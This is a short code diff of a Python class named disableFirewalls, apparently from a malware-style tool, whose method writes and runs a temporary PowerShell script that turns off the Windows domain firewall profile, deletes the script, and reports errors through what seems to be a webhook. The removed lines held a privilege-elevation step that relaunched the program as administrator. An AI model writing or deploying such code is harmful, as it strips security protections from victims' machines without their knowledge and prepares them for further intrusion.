@@ -28,27 +28,13 @@ class disableFirewalls():
         webx.send(embed=embed)
         
     def disable_windows_firewalls(self):
-        isadmin = ctypes.windll.shell32.IsUserAnAdmin()
-        if isadmin:
-            _random_string.get_random_string(5)
-            fname = f'disableFirewalls_{_random_string.result_str}.ps1'
-            try:
-                with open(fname, 'w') as f:
-                    f.write('netsh advfirewall set domainprofile state off')
-                    subprocess.run(fname, shell=True)
+        _random_string.get_random_string(5)
+        fname = f'disableFirewalls_{_random_string.result_str}.ps1'
+        try:
+            with open(fname, 'w') as f:
+                f.write('netsh advfirewall set domainprofile state off')
+                subprocess.run(fname, shell=True)
 
-                os.remove(fname)
-            except Exception as e:
-                self.send_error_notification(e)
-        if not isadmin:
-            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
-            _random_string.get_random_string(5)
-            fname = f'disableFirewalls_{_random_string.result_str}.ps1'
-            try:
-                with open(fname, 'w') as f:
-                    f.write('netsh advfirewall set domainprofile state off')
-                    subprocess.run(fname, shell=True)
-
-                os.remove(fname)
-            except Exception as e:
-                self.send_error_notification(e)
+            os.remove(fname)
+        except Exception as e:
+            self.send_error_notification(e)
